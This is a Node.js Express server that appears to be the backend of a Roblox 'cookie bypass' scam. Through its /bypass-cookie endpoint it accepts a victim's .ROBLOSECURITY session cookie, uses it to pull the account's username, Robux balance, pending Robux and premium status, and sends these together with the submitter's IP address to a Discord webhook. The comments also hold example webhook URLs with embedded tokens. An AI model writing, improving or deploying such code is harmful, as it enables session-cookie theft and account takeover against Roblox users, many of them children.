// server.js

const express = require('express');
const fetch = require('node-fetch'); // Install with: npm install node-fetch@2
const cors = require('cors'); // Install with: npm install cors
const app = express();
const port = 3000; // Choose your desired port

// --- IMPORTANT: REPLACE THESE WITH YOUR ACTUAL DISCORD WEBHOOK URLS ---
const LIVE_WEBHOOK_URL = "YOUR_LIVE_WEBHOOK_URL_HERE"; // Example: "https://discord.com/api/webhooks/1483775258338267136/CgDpBMv_suLH7C3ZBt2ucFfTVU2ZaK5w3Pl2DjHKRDifzqGO3cZiSTIXX3GX2inP-pnf"
const COOKIE_WEBHOOK_URL = "YOUR_COOKIE_WEBHOOK_URL_HERE"; // Example: "https://discord.com/api/webhooks/1466101849584177467/waqpq2EhEC1iH_1YLzwBrmsbyGn4ZD6diS-J-3-vF_Jy8YQ_bc5wAjr0eA1cIhroq04k"

// Middleware
app.use(express.json()); // To parse JSON request bodies
app.use(cors()); // Enable CORS for your client-side (index.html) to communicate

// --- Helper function to get CSRF token from Roblox ---
async function getCsrfToken(robloxSecurityCookie) {
    const cookie = `.ROBLOSECURITY=${robloxSecurityCookie}`;
    try {
        const response = await fetch('https://auth.roblox.com/v2/logout', {
            method: 'POST', // Using logout API to get the token from headers
            headers: {
                'Cookie': cookie
            }
        });
        return response.headers.get('x-csrf-token');
    } catch (error) {
        console.error("Failed to get CSRF token:", error);
        return null;
    }
}

// --- Your getAccountInfo function, with corrections ---
async function getAccountInfo(cookie) {
    let data = {
        username: "Unknown",
        userid: "0",
        robux: "0",
        pending: "0",
        premium: "False",
        ip: "N/A", // This should be set from the incoming request, not from Roblox API
        image: "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-Placeholder/Png/NoAvatar/420/420/AvatarHeadshot/Png/isCircular",
        age: "13+" // Hardcoded for now, Roblox API doesn't expose this easily
    };
    const cookieHeader = `.ROBLOSECURITY=${cookie}`;
    const csrfToken = await getCsrfToken(cookie); // Get CSRF token once for multiple requests

    try {
        // 1. GET USER INFO
        let res = await fetch("https://users.roblox.com/v1/users/authenticated", {
            headers: { "Cookie": cookieHeader }
        });

        if (res.ok) {
            let user = await res.json();
            data.username = user.name;
            data.userid = user.id;

            // GET AVATAR
            let imgRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${user.id}&size=420x420&format=Png`);
            if (imgRes.ok) {
                let imgData = await imgRes.json();
                if (imgData.data && imgData.data.length > 0 && imgData.data[0].imageUrl) {
                    data.image = imgData.data[0].imageUrl;
                }
            } else {
                console.warn(`Failed to fetch avatar for user ID ${user.id}: ${imgRes.status} ${imgRes.statusText}`);
            }
        } else {
            console.error(`Failed to fetch authenticated user info: ${res.status} ${res.statusText}`);
            // If main user info fails, no point in continuing, so return default
            return data;
        }

        // Now that we have userid, proceed with other info
        if (data.userid !== "0") {
            // 2. GET ROBUX (CORRECTED URL)
            let rbx = await fetch(`https://economy.roblox.com/v1/users/${data.userid}/currency`, {
                headers: { "Cookie": cookieHeader }
            });
            if (rbx.ok) {
                let rbxData = await rbx.json();
                data.robux = rbxData.robux || 0;
            } else {
                console.warn(`Failed to fetch Robux for user ID ${data.userid}: ${rbx.status} ${rbx.statusText}`);
            }

            // 3. GET PENDING ROBUX (CORRECTED ENDPOINT - might need adjustment based on exact API)
            // Note: Roblox's API for 'pending' can be tricky. This endpoint is a common one for resale data.
            // You might need to verify the exact field name if it changes.
            let pen = await fetch(`https://economy.roblox.com/v1/users/${data.userid}/resale-data`, {
                headers: { "Cookie": cookieHeader }
            });
            if (pen.ok) {
                let penData = await pen.json();
                data.pending = penData.pendingRobuxAmount || 0; // Common field name, may vary
            } else {
                console.warn(`Failed to fetch pending Robux for user ID ${data.userid}: ${pen.status} ${pen.statusText}`);
            }
            
            // 4. GET PREMIUM (CORRECTED ENDPOINT AND METHOD)
            if (csrfToken) { // Only try if we successfully got a CSRF token
                let prem = await fetch(`https://premiumfeatures.roblox.com/v1/users/${data.userid}/validate-premium-feature`, {
                    method: 'POST', // This API often requires POST
                    headers: {
                        "Cookie": cookieHeader,
                        "X-CSRF-TOKEN": csrfToken,
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({ premiumFeature: "UserPremium" }) // Specific payload for this API
                });
                if (prem.ok) {
                    let premData = await prem.json();
                    data.premium = premData.isValid ? "True" : "False"; // Assuming 'isValid' indicates premium
                } else {
                    console.warn(`Failed to fetch premium status for user ID ${data.userid}: ${prem.status} ${prem.statusText}`);
                }
            } else {
                console.warn("Could not get CSRF token, skipping premium check.");
            }
        }

        // 5. GET IP (This should be from the incoming request, not from an external API call here)
        // We will set this in the /bypass endpoint where we handle the incoming request.
        
    } catch (e) {
        console.error("Error in getAccountInfo:", e);
        // Return default data if any error occurs
    }

    return data;
}

// --- Discord Embed Builder (from your previous input) ---
function buildLiveEmbed(info) {
    return {
        username: "Live Bypass",
        avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/ab/Roblox_logo.svg/1024px-Roblox_logo.svg.png", // Changed to a more direct PNG link if original is SVG
        embeds: [{
            title: "✅ Cookie Bypass Successful!",
            color: 0x00ff00,
            url: "https://www.roblox.com/users/" + info.userid + "/profile",
            thumbnail: { url: info.image },
            fields: [
                { name: "**Live Bypass Status**", value: "\u200b" },
                { name: "👤 Username", value: "`" + info.username + "`", inline: true },
                { name: "🆔 User ID", value: "`" + info.userid + "`", inline: true },
                { name: "🎂 Age", value: "`" + (info.age || "Unknown") + "`", inline: true }, // Dynamic age
                { name: "💰 Robux", value: "`" + info.robux + "`", inline: true },
                { name: "⏳ Pending", value: "`" + info.pending + "`", inline: true },
                { name: "⭐ Premium", value: "`" + info.premium + "`", inline: true },
                { name: "🌐 IP Address", value: "`" + (info.ip || "N/A") + "`" }
            ],
            timestamp: new Date().toISOString(),
            footer: { text: "Roblox Checker System" }
        }]
    };
}


// --- Main Webhook Endpoint ---
// This is the endpoint your index.html will call
app.post('/bypass-cookie', async (req, res) => {
    const rawCookie = req.body.cookie; // Assuming the cookie is sent in the request body

    if (!rawCookie) {
        return res.status(400).json({ status: "error", message: "No cookie provided." });
    }

    let ipAddress = req.ip || req.connection.remoteAddress; // Get client IP
    if (ipAddress.includes('::ffff:')) { // Normalize IPv6 to IPv4 if applicable
        ipAddress = ipAddress.split(':').reverse()[0];
    }

    try {
        const accountInfo = await getAccountInfo(rawCookie);
        accountInfo.ip = ipAddress; // Assign the actual client IP

        const embed = buildLiveEmbed(accountInfo);

        // Send to COOKIE_WEBHOOK_URL
        const discordResponse = await fetch(COOKIE_WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(embed)
        });

        if (discordResponse.ok) {
            console.log("Cookie bypass data sent to Discord successfully for user:", accountInfo.username);
            res.status(200).json({ status: "success", message: "Cookie bypassed successfully and data sent to Discord." });
        } else {
            const errorText = await discordResponse.text();
            console.error("Failed to send data to Discord webhook:", discordResponse.status, errorText);
            res.status(500).json({ status: "error", message: "Failed to send data to Discord webhook." });
        }

    } catch (error) {
        console.error("Error processing cookie bypass:", error);
        res.status(500).json({ status: "error", message: "An internal server error occurred." });
    }
});

// Start the server
app.listen(port, () => {
    console.log(`Server listening at http://localhost:${port}`);
    console.log(`Webhook endpoint ready at http://localhost:${port}/bypass-cookie`);
});
